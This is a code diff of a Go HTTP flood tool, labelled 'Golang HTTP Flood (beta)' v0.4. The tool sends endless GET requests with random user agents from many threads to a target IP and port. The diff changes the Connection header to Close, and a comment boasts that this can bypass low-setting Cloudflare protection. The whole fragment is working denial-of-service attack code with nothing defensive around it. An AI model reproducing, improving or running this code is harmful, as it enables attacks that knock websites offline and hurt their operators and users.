@@ -151,12 +151,12 @@ func flood(i int) {
     url += "/?="
     url += url2
     for {
-        var useragent = GetRandom()
+        var useragent = GetRandom()//random useragent
         request := "GET /?="
         request += url2
         request += " HTTP/1.1\r\nHost: "
         request += ip 
-        request += "\r\nConnection: Keep-Alive\r\n"
+        request += "\r\nConnection: Close\r\n"//Can bypass low setting cloudflare website :)
         request += "User-Agent: "
         request += useragent
         request += "\r\n\r\n"
@@ -175,7 +175,7 @@ func flood(i int) {
 
 func main() {
     if len(os.Args) != 4 {
-        fmt.Println("Golang HTTP Flood (beta) v0.3")
+        fmt.Println("Golang HTTP Flood (beta) v0.4")
         fmt.Println("Usage: ",os.Args[0],"<ip> <port> <threads>")
         os.Exit(1)
     }
